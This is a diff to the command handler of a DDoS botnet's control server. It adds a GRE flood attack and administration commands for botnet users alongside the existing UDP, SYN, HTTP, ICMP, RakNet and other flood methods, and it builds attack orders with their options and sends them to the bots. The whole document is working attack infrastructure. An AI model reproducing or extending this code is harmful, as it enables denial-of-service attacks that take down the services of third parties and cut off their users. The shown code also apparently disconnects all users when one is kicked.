+++ cnc/command_handler.c
@@ -1,6 +1,7 @@
 #include "headers/command_handler.h"
 #include "headers/botnet.h"
 #include "headers/checks.h"
+#include "headers/user_handler.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -11,12 +12,18 @@
 void handle_bots_command(char *response);
 void handle_clear_command(char *response);
 void handle_attack_command(const User *user, const char *command, char *response);
-void handle_stopall_command(char *response);
+void handle_stopall_command(const User *user, char *response);
+void handle_user_command(const User *user, const char *command, char *response);
+void handle_adduser_command(const User *user, int client_socket);
+void handle_removeuser_command(const User *user, const char *command, char *response);
+void handle_kickuser_command(const User *user, const char *command, char *response);
+void handle_admin_command(const User *user, char *response);
 
 void handle_help_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              PINK "!misc - shows misc commands\r\n"
              "!attack - shows attack methods\r\n"
+            "!admin - show admin and root commands\r\n"
              "!help - shows this msg\r\n" RESET);
 }
 
@@ -25,28 +32,33 @@ void handle_misc_command(char *response) {
              PINK "!stopall - stops all atks\r\n"
              "!opthelp - see attack options\r\n"
              "!bots - list bots\r\n"
+             "!user - show user or other users\r\n"
              "!clear - clear screen\r\n"
              "!exit - leave CNC\r\n" RESET);
 }
 
 void handle_attack_list_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
-             PINK "!vse - VSE Queries, udp generic\r\n"
+             PINK "!vse - VSE Queries, UDP\r\n"
              "!raknet - RakNet UnConnected+Magic ping flood\r\n"
              "!udp - raw/plain flood udp\r\n"
              "!syn - plain SYN Flood\r\n"
              "!socket - open connection spam\r\n"
              "!http - HTTP 1.1 GET flood\r\n"
-             "!icmp - ICMP Echo flood\r\n" RESET);
+             "!icmp - ICMP Echo flood\r\n"
+             "!gre - GRE IP Flood\r\n" RESET);
 }
 
 void handle_opthelp_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              RED "Optional Arguments:\r\n"
-             "psize - packet size (max 64500 for ICMP-UDP-SYN)\r\n"
-             "srcport - srcport,  static helps bypass sometimes (max 65500, UDP-SYN)\r\n"
-             "botcount - number of bots to use (global)\r\n" RESET);
-}
+             "psize - packet size (max: 64500-ICMP-UDP-SYN | 1492 VSE-RakNet | 8192-GRE)\r\n"
+             "srcport - srcport for UDP-SYN-GRE, Default=Random, max=65535)\r\n"
+             "botcount - Limit bots to use\r\n"
+             "proto - GRE Proto (tcp/udp) default=none\r\n"
+             "gport - destport for GRE\r\n"
+            );
+             }
 
 int is_attack_command(const char *command) {
     return strncmp(command, "!udp", 4) == 0 ||
@@ -55,23 +67,38 @@ int is_attack_command(const char *command) {
            strncmp(command, "!raknet", 7) == 0 ||
            strncmp(command, "!http", 5) == 0 ||
            strncmp(command, "!socket", 7) == 0 ||
-           strncmp(command, "!icmp", 5) == 0;
+           strncmp(command, "!icmp", 5) == 0 ||
+           strncmp(command, "!gre", 4) == 0;
 }
 
 void handle_layer3_attack_command(const User *user, const char *command, char *response) {
     char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH] = {0};
-    int time = 0, psize = 0, botcount = 0;
-    int has_psize = 0, has_botcount = 0;
+    int time = 0, psize = 0, botcount = 0, gport = 0, srcport = 0;
+    int has_psize = 0, has_botcount = 0, has_proto = 0, has_gport = 0, has_srcport = 0;
+    char proto[8] = {0};
     char *args[32] = {0};
     int arg_count = 0;
+    int is_icmp = 0, is_gre = 0;
 
-    if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {
-        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: %s <ipv4> <time> [options]\033[0m\n", cmd);
-        return;
+if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {        
+            if (strncmp(cmd, "!gre", 4) == 0)
+                snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !gre <ipv4> <time> [options] (recommended !opthelp)\033[0m\n");
+            else
+                snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: %s <ipv4> <time> [options]\033[0m\n", cmd);
+            return;
     }
 
     if (!validate_ip(ip) || time <= 0 || time > user->maxtime) {
         snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid IP or time\033[0m\n");
+        return;
+    }
+
+    if (is_blacklisted(ip)) {
+        if (is_private_ip(ip)) {
+            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Cannot attack private/reserved IP addresses\033[0m\n");
+        } else {
+            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Target is blacklisted\033[0m\n");
+        }
         return;
     }
 
@@ -81,6 +108,13 @@ void handle_layer3_attack_command(const User *user, const char *command, char *r
             args[arg_count++] = token;
             token = strtok(NULL, " ");
         }
+    }
+
+    if (strncmp(cmd, "!icmp", 5) == 0) {
+        is_icmp = 1;
+    } else if (strncmp(cmd, "!gre", 4) == 0) {
+        is_gre = 1;
+        psize = 32;
     }
 
     for (int i = 0; i < arg_count; i++) {
@@ -95,9 +129,16 @@ void handle_layer3_attack_command(const User *user, const char *command, char *r
                 return;
             }
             psize = atoi(val);
-            if (!validate_psize(psize, cmd)) {
-                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize\033[0m\n");
-                return;
+            if (is_gre) {
+                if (psize <= 0 || psize > 8192) {
+                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mpsize MUST be 1-8192 for gre\033[0m\n");
+                    return;
+                }
+            } else {
+                if (!validate_psize(psize, cmd)) {
+                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize\033[0m\n");
+                    return;
+                }
             }
             has_psize = 1;
         } else if (strncmp(args[i], "botcount=", 9) == 0) {
@@ -120,8 +161,70 @@ void handle_layer3_attack_command(const User *user, const char *command, char *r
                 return;
             }
             has_botcount = 1;
-        } else {
+        } else if (is_gre && strncmp(args[i], "srcport=", 8) == 0) {
+            if (has_srcport) {
+                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate srcport option\033[0m\n");
+                return;
+            }
+            const char *val = args[i] + 8;
+            if (!is_valid_int(val)) {
+                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport (need int)\033[0m\n");
+                return;
+            }
+            srcport = atoi(val);
+            if (!validate_srcport(srcport)) {
+                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport value (must be 1-65535)\033[0m\n");
+                return;
+            }
+            has_srcport = 1;
+        } else if (is_gre && strncmp(args[i], "proto=", 6) == 0) {
+            if (has_proto) {
+                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate proto option\033[0m\n");
+                return;
+            }
+            strncpy(proto, args[i] + 6, sizeof(proto) - 1);
+            proto[sizeof(proto) - 1] = '\0';
+            if (strcmp(proto, "tcp") != 0 && strcmp(proto, "udp") != 0) {
+                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid proto value, must be tcp or udp\033[0m\n");
+                return;
+            }
+            has_proto = 1;
+        } else if (is_gre && strncmp(args[i], "gport=", 6) == 0) {
+            if (has_gport) {
+                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate gport argument\033[0m\n");
+                return;
+            }
+            const char *val = args[i] + 6;
+            if (!is_valid_int(val)) {
+                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid gport (need int)\033[0m\n");
+                return;
+            }
+            gport = atoi(val);
+            if (!validate_port(gport)) {
+                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid gport value (must be 1-65535)\033[0m\n");
+                return;
+            }
+            has_gport = 1;
+        } else if (!is_gre) {
             snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
+            return;
+        } else if (is_gre) {
+            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
+            return;
+        }
+    }
+
+    if (is_gre) {
+        if (has_proto && !has_gport) {
+            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mgport= is required when proto= is set\033[0m\n");
+            return;
+        }
+        if (!has_proto && has_gport) {
+            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mproto= is required when using gport=\033[0m\n");
+            return;
+        }
+        if (has_srcport && !has_proto) {
+            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mproto= is required when using srcport=\033[0m\n");
             return;
         }
     }
@@ -143,10 +246,26 @@ void handle_layer3_attack_command(const User *user, const char *command, char *r
         if (bots[i].is_valid) {
             if (sent_bots >= requested_bots) break;
             char bot_command[MAX_COMMAND_LENGTH];
-            if (has_psize)
-                snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
-            else
-                snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
+            if (is_gre) {
+                if (has_proto && has_srcport)
+                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d srcport=%d", cmd, ip, time, psize, proto, gport, srcport);
+                else if (has_proto)
+                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d", cmd, ip, time, psize, proto, gport);
+                else if (has_srcport)
+                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d srcport=%d", cmd, ip, time, psize, srcport);
+                else
+                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
+            } else if (is_icmp) {
+                if (has_psize)
+                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
+                else
+                    snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
+            } else {
+                if (has_psize)
+                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
+                else
+                    snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
+            }
             send(bots[i].socket, bot_command, strlen(bot_command), 0);
             sent_bots++;
         }
@@ -184,6 +303,8 @@ void process_command(const User *user, const char *command, int client_socket, c
         return;
     } else if (strcmp(command, "!misc") == 0) {
         handle_misc_command(response);
+    } else if (strcmp(command, "!admin") == 0) {
+        handle_admin_command(user, response);
     } else if (strcmp(command, "!attack") == 0) {
         handle_attack_list_command(response);
     } else if (strcmp(command, "!bots") == 0) {
@@ -197,12 +318,32 @@ void process_command(const User *user, const char *command, int client_socket, c
         send(client_socket, response, strlen(response), 0);
         close(client_socket);
         return;
-    } else if (strncmp(command, "!icmp", 5) == 0) {
+    } else if (strncmp(command, "!user", 5) == 0) {
+        handle_user_command(user, command, response);
+    } else if (strcmp(command, "!adduser") == 0) {
+        handle_adduser_command(user, client_socket);
+        return;
+    } else if (strncmp(command, "!removeuser", 10) == 0) {
+        handle_removeuser_command(user, command, response);
+    } else if (strncmp(command, "!kickuser", 9) == 0) {
+        handle_kickuser_command(user, command, response);
+    } else if (strncmp(command, "!icmp", 5) == 0 || strncmp(command, "!gre", 4) == 0) {
         handle_layer3_attack_command(user, command, response);
     } else if (is_attack_command(command)) {
         handle_attack_command(user, command, response);
     } else if (strcmp(command, "!stopall") == 0) {
-        handle_stopall_command(response);
+        handle_stopall_command(user, response);
+    } else if (strncmp(command, "!user", 5) == 0) {
+        handle_user_command(user, command, response);
+    } else if (strcmp(command, "!adduser") == 0) {
+        handle_adduser_command(user, client_socket);
+        return;
+    } else if (strncmp(command, "!removeuser", 11) == 0) {
+        handle_removeuser_command(user, command, response);
+    } else if (strncmp(command, "!kickuser", 9) == 0) {
+        handle_kickuser_command(user, command, response);
+    } else if (strcmp(command, "!admin") == 0) {
+        handle_admin_command(user, response);
     } else {
         snprintf(response, sizeof(response), RED "\rCommand not found\n" RESET);
     }
@@ -232,6 +373,15 @@ void handle_attack_command(const User *user, const char *command, char *response
 
     if (!validate_ip(ip) || time <= 0 || time > user->maxtime) {
         snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid IP or time\033[0m\n");
+        return;
+    }
+
+    if (is_blacklisted(ip)) {
+        if (is_private_ip(ip)) {
+            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Cannot attack private/reserved IP addresses\033[0m\n");
+        } else {
+            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Target is blacklisted\033[0m\n");
+        }
         return;
     }
 
@@ -404,14 +554,334 @@ void handle_clear_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH, "\033[H\033[J");
 }
 
-void handle_stopall_command(char *response) {
+void handle_stopall_command(const User *user, char *response) {
+    int allow_stopall = 0;
+    
+    if (user->is_admin) {
+        allow_stopall = 1;
+    } else {
+        FILE* sf = fopen("database/settings.txt", "r");
+        if (sf) {
+            char line[128] = {0};
+            while (fgets(line, sizeof(line), sf)) {
+                if (strncmp(line, "globalstopall:", 13) == 0) {
+                    allow_stopall = strstr(line, "yes") ? 1 : 0;
+                    break;
+                }
+            }
+            fclose(sf);
+        }
+    }
+
+    if (!allow_stopall) {
+        snprintf(response, MAX_COMMAND_LENGTH, "\r" RED "Error: You don't have permission to use !stopall\n" RESET);
+        return;
+    }
+
+    int stopped_count = 0;
     pthread_mutex_lock(&bot_mutex);
     for (int i = 0; i < bot_count; i++) {
-        send(bots[i].socket, "stop", strlen("stop"), 0);
+        if (bots[i].is_valid && bots[i].socket > 0) {
+            if (send(bots[i].socket, "stop", strlen("stop"), MSG_NOSIGNAL) > 0) {
+                stopped_count++;
+            }
+        }
     }
     pthread_mutex_unlock(&bot_mutex);
-    snprintf(response, MAX_COMMAND_LENGTH, "\rAttempting to stop attacks...\n");
+    
     pthread_mutex_lock(&cooldown_mutex);
     global_cooldown = 0;
     pthread_mutex_unlock(&cooldown_mutex);
+    
+    snprintf(response, MAX_COMMAND_LENGTH, "\r" PINK "Sent stop command to %d active bots\n" RESET, stopped_count);
+}
+
+void handle_user_command(const User *user, const char *command, char *response) {
+    if (!user->is_admin) {
+        FILE *sf = fopen("database/settings.txt", "r");
+        int allow_non_admin = 0;
+        if (sf) {
+            char line[128];
+            while (fgets(line, sizeof(line), sf)) {
+                if (strncmp(line, "globalusercommand:", 17) == 0 && strstr(line, "yes")) {
+                    allow_non_admin = 1;
+                    break;
+                }
+            }
+            fclose(sf);
+        }
+        if (!allow_non_admin) {
+            snprintf(response, MAX_COMMAND_LENGTH, RED "Only admins can use !user command\r\n" RESET);
+            return;
+        }
+    }
+    
+    char target_user[50] = {0};
+    if (sscanf(command, "!user %49s", target_user) == 1) {
+        int found = 0;
+        for (int i = 0; i < user_count; i++) {
+            if (strcmp(users[i].user, target_user) == 0) {
+                snprintf(response, MAX_COMMAND_LENGTH,
+                    BLUE "Username: %s\r\n"
+                    "Max time: %d\r\n"
+                    "Max bots: %d\r\n"
+                    "Admin: %s\r\n"
+                    "Connected: %s\r\n" RESET,
+                    users[i].user,
+                    users[i].maxtime,
+                    users[i].maxbots,
+                    users[i].is_admin ? "yes" : "no",
+                    users[i].is_logged_in ? "yes" : "no");
+                found = 1;
+                break;
+            }
+        }
+        if (!found) {
+            snprintf(response, MAX_COMMAND_LENGTH, RED "User not found\r\n" RESET);
+        }
+    } else {
+        snprintf(response, MAX_COMMAND_LENGTH,
+            BLUE "Username: %s\r\n"
+            "Max time: %d\r\n"
+            "Max bots: %d\r\n"
+            "Admin: %s\r\n"
+            "Connected: yes\r\n" RESET,
+            user->user,
+            user->maxtime,
+            user->maxbots,
+            user->is_admin ? "yes" : "no");
+    }
+}
+
+void handle_adduser_command(const User *user, int client_socket) {
+    FILE *sf = fopen("database/settings.txt", "r");
+    char rootuser[50] = {0};
+    int is_root = 0;
+    
+    if (sf) {
+        char line[128];
+        while (fgets(line, sizeof(line), sf)) {
+            if (strncmp(line, "rootuser:", 9) == 0) {
+                sscanf(line + 9, " %49s", rootuser);
+                if (strcmp(user->user, rootuser) == 0) {
+                    is_root = 1;
+                }
+                break;
+            }
+        }
+        fclose(sf);
+    }
+
+    if (!is_root) {
+        char response[MAX_COMMAND_LENGTH];
+        snprintf(response, sizeof(response), RED "Only root user can add users\r\n" RESET);
+        send(client_socket, response, strlen(response), 0);
+        return;
+    }
+
+    char response[MAX_COMMAND_LENGTH];
+    snprintf(response, sizeof(response), "Select Name: ");
+    send(client_socket, response, strlen(response), 0);
+    
+    char buffer[128];
+    int len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
+    if (len <= 0) return;
+    buffer[len] = 0;
+    char newuser[50];
+    sscanf(buffer, "%49s", newuser);
+
+    snprintf(response, sizeof(response), "Select Password: ");
+    send(client_socket, response, strlen(response), 0);
+    
+    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
+    if (len <= 0) return;
+    buffer[len] = 0;
+    char newpass[50];
+    sscanf(buffer, "%49s", newpass);
+
+    sleep(1);
+    send(client_socket, response, strlen(response), 0);
+    
+    int maxtime, maxbots;
+    char admin[4];
+
+
+    sleep(1);
+    snprintf(response, sizeof(response), "Max time: ");
+    send(client_socket, response, strlen(response), 0);
+    
+    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
+    if (len <= 0) return;
+    buffer[len] = 0;
+    sscanf(buffer, "%d", &maxtime);
+
+    snprintf(response, sizeof(response), "Max bots: ");
+    send(client_socket, response, strlen(response), 0);
+    
+    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
+    if (len <= 0) return;
+    buffer[len] = 0;
+    sscanf(buffer, "%d", &maxbots);
+
+    snprintf(response, sizeof(response), "Admin? (yes/no): ");
+    send(client_socket, response, strlen(response), 0);
+    
+    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
+    if (len <= 0) return;
+    buffer[len] = 0;
+    sscanf(buffer, "%3s", admin);
+
+
+    FILE *f = fopen("database/logins.txt", "a");
+    if (f) {
+        if (strcmp(admin, "yes") == 0) {
+            fprintf(f, "%s %s %d %d admin\n", newuser, newpass, maxtime, maxbots);
+        } else {
+            fprintf(f, "%s %s %d %d\n", newuser, newpass, maxtime, maxbots);
+        }
+        fclose(f);
+        
+        snprintf(response, sizeof(response), 
+                 GREEN "User added!\r\n"
+                 "Username: %s\r\n"
+                 "Password: %s\r\n" RESET,
+                 newuser, newpass);
+    } else {
+        snprintf(response, sizeof(response), RED "Failed to add user\r\n" RESET);
+    }
+    send(client_socket, response, strlen(response), 0);
+}
+
+void handle_removeuser_command(const User *user, const char *command, char *response) {
+    FILE *sf = fopen("database/settings.txt", "r");
+    char rootuser[50] = {0};
+    int is_root = 0;
+    
+    if (sf) {
+        char line[128];
+        while (fgets(line, sizeof(line), sf)) {
+            if (strncmp(line, "rootuser:", 9) == 0) {
+                sscanf(line + 9, " %49s", rootuser);
+                if (strcmp(user->user, rootuser) == 0) {
+                    is_root = 1;
+                }
+                break;
+            }
+        }
+        fclose(sf);
+    }
+
+    if (!is_root) {
+        snprintf(response, MAX_COMMAND_LENGTH, RED "Only root user can remove users\r\n" RESET);
+        return;
+    }    char target[50];
+    if (sscanf(command, "!removeuser %49s", target) != 1) {
+        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: !removeuser <username>\r\n" RESET);
+        return;
+    }
+
+    if (strcmp(target, rootuser) == 0) {
+        snprintf(response, MAX_COMMAND_LENGTH, RED "Cannot remove root user\r\n" RESET);
+        return;
+    }
+
+    FILE *f = fopen("database/logins.txt", "r");
+    FILE *temp = fopen("database/logins.tmp", "w");
+    if (!f || !temp) {
+        snprintf(response, MAX_COMMAND_LENGTH, RED "Failed to remove user\r\n" RESET);
+        if (f) fclose(f);
+        if (temp) fclose(temp);
+        return;
+    }
+
+    char line[256];
+    int found = 0;
+    while (fgets(line, sizeof(line), f)) {
+        char current[50];
+        if (sscanf(line, "%49s", current) == 1) {
+            if (strcmp(current, target) != 0) {
+                fputs(line, temp);
+            } else {
+                found = 1;
+            }
+        }
+    }
+
+    fclose(f);
+    fclose(temp);
+
+    if (found) {
+        remove("database/logins.txt");
+        rename("database/logins.tmp", "database/logins.txt");
+        load_users();
+        snprintf(response, MAX_COMMAND_LENGTH, GREEN "User %s removed\r\n" RESET, target);
+    } else {
+        remove("logins.tmp");
+        snprintf(response, MAX_COMMAND_LENGTH, RED "User not found\r\n" RESET);
+    }
+}
+
+void handle_kickuser_command(const User *user, const char *command, char *response) {
+    if (!user->is_admin) {
+        FILE *sf = fopen("database/settings.txt", "r");
+        int allow_non_admin = 0;
+        if (sf) {
+            char line[128];
+            while (fgets(line, sizeof(line), sf)) {
+                if (strncmp(line, "globalstopall:", 13) == 0 && strstr(line, "yes")) {
+                    allow_non_admin = 1;
+                    break;
+                }
+            }
+            fclose(sf);
+        }
+        if (!allow_non_admin) {
+            snprintf(response, MAX_COMMAND_LENGTH, RED "Error: You need to be admin or have globalstopall enabled to kick users\r\n" RESET);
+            return;
+        }
+    }
+
+    char target[50];
+    if (sscanf(command, "!kickuser %49s", target) != 1) {
+        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: !kickuser <username>\r\n" RESET);
+        return;
+    }
+
+    int found = 0;
+    for (int i = 0; i < user_count; i++) {
+        if (strcmp(users[i].user, target) == 0) {
+            if (!users[i].is_logged_in) {
+                snprintf(response, MAX_COMMAND_LENGTH, RED "User not connected\r\n" RESET);
+                return;
+            }
+            for (int j = 0; j < MAX_USERS; j++) {
+                if (user_sockets[j] > 0) {
+                    close(user_sockets[j]);
+                    user_sockets[j] = 0;
+                }
+            }
+            users[i].is_logged_in = 0;
+            found = 1;
+            break;
+        }
+    }
+
+    if (found) {
+        snprintf(response, MAX_COMMAND_LENGTH, GREEN "Kicked user %s\r\n" RESET, target);
+    } else {
+        snprintf(response, MAX_COMMAND_LENGTH, RED "User not found\r\n" RESET);
+    }
+}
+
+void handle_admin_command(const User *user, char *response) {
+    if (!user->is_admin) {
+        snprintf(response, MAX_COMMAND_LENGTH, RED "Only admins can use !admin command\r\n" RESET);
+        return;
+    }
+    
+    snprintf(response, MAX_COMMAND_LENGTH,
+             PINK "Admin Commands:\r\n"
+             "!adduser - Add a new user\r\n"
+             "!removeuser <username> - Remove a user\r\n"
+             "!kickuser <username> - Kick a connected user\r\n" RESET);
 }